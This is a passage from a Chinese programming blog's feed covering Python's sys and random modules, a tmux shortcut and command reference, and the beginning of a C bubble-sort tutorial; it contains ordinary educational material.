10.sys.err</h4><p>与前面两个属性类似，只不过该属性标识的是标准错误，通常也是定向到屏幕的，可以粗糙地认为是一个输出错误信息的特殊的标准输出流。由于性质类似，因此不做演示。</p><p>此外，<code>sys</code>模块中还存在几个“私有”属性：<code>sys.__stdin__</code>，<code>sys.__stdout__</code>，<code>sys.__stderr__</code>。这几个属性中保存的就是最初定向的“标准输入”、“标准输出”和“标准错误”流。在适当的时侯，我们可以借助这三个属性将<code>sys.stdin</code>、<code>sys.stdout</code>和<code>sys.err</code>恢复为初始值。</p><h4 id="11sysgetrecursionlimit-和-syssetrecursionlimit"><a class="markdownIt-Anchor" href="#11sysgetrecursionlimit-和-syssetrecursionlimit"></a> 11.sys.getrecursionlimit() 和 sys.setrecursionlimit()</h4><p><code>sys.getrecursionlimit()</code>和<code>sys.setrecursionlimit()</code>是成对的。前者可以获取 Python 的最大递归数目，后者则可以设置最大递归数目。因为初学阶段很少用到，因此只做了解。</p><h4 id="12sysgetrefcount"><a class="markdownIt-Anchor" href="#12sysgetrefcount"></a> 12.sys.getrefcount()</h4><p>在《<a href="http://www.justdopython.com/2019/09/12/python-reference-012" target="_blank" rel="noopener">第12天：Python 之引用</a>》中我们其实已经用到过这个函数，其返回值是 Python 中某个对象被引用的次数。关于“引用”的知识可以回去看看这篇文章。</p><h4 id="13sysgetsizeof"><a class="markdownIt-Anchor" href="#13sysgetsizeof"></a> 13.sys.getsizeof()</h4><p>这个函数的作用与 C 语言中的<code>sizeof</code>运算符类似，返回的是作用对象所占用的字节数。</p><p>比如我们就可以看看一个整型对象<code>1</code>在内存中的大小：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.getsizeof(<span class="number">1</span>)</span><br><span class="line"><span class="number">28</span></span><br></pre></td></tr></table></figure><p>注意，在 Python 中，某类对象的大小并非一成不变的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.getsizeof(<span class="number">2</span>**<span class="number">30</span><span class="number">-1</span>)</span><br><span class="line"><span class="number">28</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.getsizeof(<span class="number">2</span>**<span class="number">30</span>)</span><br><span class="line"><span class="number">32</span></span><br></pre></td></tr></table></figure><h4 id="14sysint_info-和-sysfloat_info"><a class="markdownIt-Anchor" href="#14sysint_info-和-sysfloat_info"></a> 14.sys.int_info 和 sys.float_info</h4><p>这两个属性分别给出了 Python 中两个重要的数据类型的相关信息。</p><p>其中<code>sys.int_info</code>的值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.int_info</span><br><span class="line">sys.int_info(bits_per_digit=30, sizeof_digit=4)</span><br></pre></td></tr></table></figure><p>在文档中的解释为：</p><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">bits_per_digit</td><td style="text-align:center">number of bits held in each digit. Python integers are stored internally in base <code>2**int_info.bits_per_digit</code></td></tr><tr><td style="text-align:center">sizeof_digit</td><td style="text-align:center">size in bytes of the C type used to represent a digit</td></tr></tbody></table><p>指的是 Python 以 2 的<code>sys.int_info.bits_per_digit</code>次方为基来表示整数，也就是说它是“2 的<code>sys.int_info.bits_per_digit</code>次方进制”的数。这样的数每一个为都用 C 类中的 4 个字节来存储。</p><p>换句话说，每“进 1 位”（即整数值增加2 的<code>sys.int_info.bits_per_digit</code>次方），就需要多分配 4 个字节用以保存某个整数。</p><p>因此在<code>sys.getsizeof()</code>的示例中，我们可以看到<code>2**30-1</code>和<code>2**30</code>之间，虽然本身只差了 1，但是所占的字节后者却比前者多了 4。</p><p>而<code>sys.float_info</code>的值则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.float_info</span><br><span class="line">sys.float_info(max=1.7976931348623157e+308, max_exp=1024, max_10_exp=308, min=2.2250738585072014e-308, min_exp=-1021, min_10_exp=-307, dig=15, mant_dig=53, epsilon=2.220446049250313e-16, radix=2, rounds=1)</span><br></pre></td></tr></table></figure><p>其中各项具体的含义就不在这里继续展开了，感兴趣的同学可以参看<a href="https://docs.python.org/3/library/sys.html?highlight=sys.float_info#sys.float_info" target="_blank" rel="noopener">文档</a>和<a href="https://book.douban.com/subject/26912767/" target="_blank" rel="noopener">《深入理解计算机系统》</a>等讲解组成原理的书。</p><h3 id="0x0a-random-模块"><a class="markdownIt-Anchor" href="#0x0a-random-模块"></a> 0x0A random 模块</h3><h4 id="1randomrandintstart-end-方法"><a class="markdownIt-Anchor" href="#1randomrandintstart-end-方法"></a> 1.random.randint(start, end) 方法</h4><blockquote><p>产生 start 到 end 的一个整数型随机数</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line"><span class="number">34</span></span><br></pre></td></tr></table></figure><h4 id="2randomrandom-方法"><a class="markdownIt-Anchor" href="#2randomrandom-方法"></a> 2.random.random() 方法</h4><blockquote><p>产生 0 到 1 之间的随机浮点数</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.random()</span><br><span class="line"><span class="number">0.931770155505083</span></span><br></pre></td></tr></table></figure><h4 id="3randomuniformstart-end-方法"><a class="markdownIt-Anchor" href="#3randomuniformstart-end-方法"></a> 3.random.uniform(start, end) 方法</h4><blockquote><p>产生  1.1 到 5.4 之间的随机浮点数，区间可以不是整数</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.uniform(<span class="number">1.1</span>,<span class="number">5.4</span>)</span><br><span class="line"><span class="number">2.387412380799667</span></span><br></pre></td></tr></table></figure><h4 id="4randomchoice序列-方法"><a class="markdownIt-Anchor" href="#4randomchoice序列-方法"></a> 4.random.choice(序列) 方法</h4><blockquote><p>从序列（字符串、列表、字典等）中随机选取一个元素</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.choice(<span class="string">'tomorrow'</span>)</span><br><span class="line"><span class="string">'o'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.choice(<span class="string">'tomorrow'</span>)</span><br><span class="line"><span class="string">'r'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.choice([<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>])</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.choice([<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>])</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.choice(&#123;<span class="number">1</span>:<span class="number">3</span>,<span class="number">4</span>:<span class="number">5</span>&#125;)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="5randomrandrangestartendstep-方法"><a class="markdownIt-Anchor" href="#5randomrandrangestartendstep-方法"></a> 5.random.randrange(start,end,step) 方法</h4><blockquote><p>生成从start到end的间隔为step的随机整数</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.randrange(<span class="number">1</span>,<span class="number">100</span>,<span class="number">2</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.randrange(<span class="number">1</span>,<span class="number">100</span>,<span class="number">2</span>)</span><br><span class="line"><span class="number">9</span></span><br></pre></td></tr></table></figure><h4 id="6randomshuffleitems-方法"><a class="markdownIt-Anchor" href="#6randomshuffleitems-方法"></a> 6.random.shuffle(items) 方法</h4><blockquote><p>将序列 items 中的元素顺序打乱</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]                <span class="comment"># 将序列a中的元素顺序打乱</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.shuffle(a)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a)</span><br><span class="line">[<span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-colornavy0x00-导入库的的方式font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-colornavy0x00-导入库的的方式font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;0x00 导入库
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Tmux工具使用总结</title>
    <link href="https://muzibing.github.io/2020/08/29/2020.08.29%EF%BC%88147%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/29/2020.08.29（147）/</id>
    <published>2020-08-28T16:00:00.000Z</published>
    <updated>2020-08-29T08:31:38.019Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-Tmux简介"><a href="#0x00-Tmux简介" class="headerlink" title="0x00 Tmux简介"></a><font color="navy"><code>0x00 Tmux简介</code></font></h3><blockquote><p>tmux是一款优秀的终端复用软件，它比Screen更加强大，至于如何强大，网上有大量的文章讨论了这点，本文不再重复。tmux之所以受人们喜爱，主要得益于以下三处功能：</p><ul><li><code>丝滑分屏（split）</code>：虽然iTem2也提供了横向和竖向分屏功能，但这种分屏功能非常拙劣，完全等同于屏幕新开一个窗口，新开的pane不会自动进入到当前目录，也没有记住当前登录状态。这意味着如果我ssh进入到远程服务器时，iTem2新开的pane中，我依然要重新走一遍ssh登录的老路（omg）。tmux就不会这样，tmux窗口中，新开的pane，默认进入到之前的路径，如果是ssh连接，登录状态也依旧保持着，如此一来，我就可以随意的增删pane，这种灵活性，好处不言而喻。</li><li><code>保护现场（attach）</code>：即使命令行的工作只进行到一半，关闭终端后还可以重新进入到操作现场，继续工作。对于ssh远程连接而言，即使网络不稳定也没有关系，掉线后重新连接，可以直奔现场，之前运行中的任务，依旧在跑，就好像从来没有离开过一样；特别是在远程服务器上运行耗时的任务，tmux可以帮你一直保持住会话。如此一来，你就可以随时随地放心地进行移动办公，只要你附近的计算机装有tmux（没有你也可以花几分钟装一个），你就能继续刚才的工作。</li><li><code>会话共享（适用于结对编程或远程教学）</code>，将 tmux 会话的地址分享给他人，这样他们就可以通过 SSH 接入该会话。如果你要给同事演示远程服务器的操作，他不必直勾勾地盯着你的屏幕，借助tmux，他完全可以进入到你的会话，然后静静地看着他桌面上你风骚的键盘走位，只要他愿意，甚至还可以录个屏。</li></ul></blockquote><h3 id="0x01-Tmux快捷指令"><a href="#0x01-Tmux快捷指令" class="headerlink" title="0x01 Tmux快捷指令"></a><font color="navy"><code>0x01 Tmux快捷指令</code></font></h3><blockquote><p>关于快捷指令，首先要认识到的是：tmux的所有指令，都包含同一个前缀，默认为<code>Ctrl+b</code>，输入完前缀过后，控制台激活，命令按键才能生效。</p></blockquote><p><code>表一：系统指令</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">前缀</th><th style="text-align:center">指令</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>?</code></td><td style="text-align:center">显示快捷键帮助文档</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>d</code></td><td style="text-align:center">断开当前会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>D</code></td><td style="text-align:center">选择要断开的会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Ctrl+z</code></td><td style="text-align:center">挂起当前会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>r</code></td><td style="text-align:center">强制重载当前会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>s</code></td><td style="text-align:center">显示会话列表用于选择并切换</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>:</code></td><td style="text-align:center">进入命令行模式，此时可直接输入<code>ls</code>等命令</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>[</code></td><td style="text-align:center">进入复制模式，按<code>q</code>退出</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>]</code></td><td style="text-align:center">粘贴复制模式中复制的文本</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>~</code></td><td style="text-align:center">列出提示信息缓存</td></tr></tbody></table></div><p><code>表二：窗口（window）指令。</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">前缀</th><th style="text-align:center">指令</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>c</code></td><td style="text-align:center">新建窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>&amp;</code></td><td style="text-align:center">关闭当前窗口（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>0~9</code></td><td style="text-align:center">切换到指定窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>p</code></td><td style="text-align:center">切换到上一窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>n</code></td><td style="text-align:center">切换到下一窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>w</code></td><td style="text-align:center">打开窗口列表，用于且切换窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>,</code></td><td style="text-align:center">重命名当前窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>.</code></td><td style="text-align:center">修改当前窗口编号（适用于窗口重新排序）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>f</code></td><td style="text-align:center">快速定位到窗口（输入关键字匹配窗口名称）</td></tr></tbody></table></div><p><code>表三：面板（pane）指令</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">前缀</th><th style="text-align:center">指令</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>&quot;</code></td><td style="text-align:center">当前面板上下一分为二，下侧新建面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>%</code></td><td style="text-align:center">当前面板左右一分为二，右侧新建面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>x</code></td><td style="text-align:center">关闭当前面板（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>z</code></td><td style="text-align:center">最大化当前面板，再重复一次按键后恢复正常（v1.8版本新增）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>!</code></td><td style="text-align:center">将当前面板移动到新的窗口打开（原窗口中存在两个及以上面板有效）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>;</code></td><td style="text-align:center">切换到最后一次使用的面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>q</code></td><td style="text-align:center">显示面板编号，在编号消失前输入对应的数字可切换到相应的面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>{</code></td><td style="text-align:center">向前置换当前面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>}</code></td><td style="text-align:center">向后置换当前面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Ctrl+o</code></td><td style="text-align:center">顺时针旋转当前窗口中的所有面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>方向键</code></td><td style="text-align:center">移动光标切换面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>o</code></td><td style="text-align:center">选择下一面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>空格键</code></td><td style="text-align:center">在自带的面板布局中循环切换</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Alt+方向键</code></td><td style="text-align:center">以5个单元格为单位调整当前面板边缘</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Ctrl+方向键</code></td><td style="text-align:center">以1个单元格为单位调整当前面板边缘（Mac下被系统快捷键覆盖）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>t</code></td><td style="text-align:center">显示时钟</td></tr></tbody></table></div><h3 id="0x02-会话管理"><a href="#0x02-会话管理" class="headerlink" title="0x02 会话管理"></a><font color="navy"><code>0x02 会话管理</code></font></h3><blockquote><p> 新建会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux new -s &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>分离会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux detach</span></span><br></pre></td></tr></table></figure><blockquote><p>查看会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux ls</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> or</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux list-session</span></span><br></pre></td></tr></table></figure><blockquote><p>接入会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用会话编号</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux attach -t 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用会话名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux attach -t &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>杀死会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用会话编号</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux <span class="built_in">kill</span>-session -t 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用会话名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux <span class="built_in">kill</span>-session -t &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>切换会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用会话编号</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux switch -t 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用会话名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux switch -t &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>重命名会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux rename-session -t 0 &lt;new-name&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x03-窗口管理"><a href="#0x03-窗口管理" class="headerlink" title="0x03 窗口管理"></a><font color="navy"><code>0x03 窗口管理</code></font></h3><blockquote><p>划分窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 划分上下两个窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux split-window</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 划分左右两个窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux split-window -h</span></span><br></pre></td></tr></table></figure><blockquote><p>移动光标</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到上方窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -U</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到下方窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -D</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到左边窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -L</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到右边窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -R</span></span><br></pre></td></tr></table></figure><blockquote><p>交换窗口位置</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 当前窗格上移</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux swap-pane -U</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当前窗格下移</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux swap-pane -D</span></span><br></pre></td></tr></table></figure><blockquote><p>新建窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux new-window</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一个指定名称的窗口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux new-window -n &lt;window-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>切换窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 切换到指定编号的窗口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-window -t &lt;window-number&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 切换到指定名称的窗口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-window -t &lt;window-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>重命名窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux rename-window &lt;new-name&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-Tmux简介&quot;&gt;&lt;a href=&quot;#0x00-Tmux简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 Tmux简介&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 Tmux简介&lt;/code&gt;&lt;/font&gt;&lt;/h
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>算法总结（C）</title>
    <link href="https://muzibing.github.io/2020/08/28/2020.08.28%EF%BC%88146%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/28/2020.08.28（146）/</id>
    <published>2020-08-27T16:00:00.000Z</published>
    <updated>2020-09-17T10:34:06.100Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-orangec-排序算法font"><a class="markdownIt-Anchor" href="#font-color-orangec-排序算法font"></a> <font color="orange"><code>C 排序算法</code></font></h2><hr><h3 id="font-color-navy0x00-冒泡排序font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-冒泡排序font"></a> <font color="navy"><code>0x00 冒泡排序</code></font></h3><p><img src="/images/146-2.png" alt></p><h4 id="1算法思想"><a class="markdownIt-Anchor" href="#1算法思想"></a> <code>1.算法思想</code></h4><p>冒泡排序的基本思想就是：</p><blockquote><p>从无序序列头部开始，进行两两比较，根据大小交换位置，直到最后将最大（小）的数据元素交换到了无序队列的队尾，从而成为有序序列的一部分；下一次继续这个过程，直到所有数据元素都排好序。</p><p>算法的核心在于每次通过两两比较交换位置，选出剩余无序序列里最大（小）的数据元素放到队尾。</p></blockquote><h4 id="2图解算法"><a class="markdownIt-Anchor" href="#2图解算法"></a> <code>2.图解算法</code></h4><p><img src="/images/146-1.gif" alt></p><h4 id="3算法实现"><a class="markdownIt-Anchor" href="#3算法实现"></a> <code>3.算法实现</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubble_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, temp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++)</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                temp = arr[j];</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123; <span class="number">22</span>, <span class="number">34</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">82</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">64</span>, <span class="number">35</span>, <span class="number">9</span>, <span class="number">70</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> len = (<span class="keyword">int</span>) <span class="keyword">sizeof</span>(arr) / <span 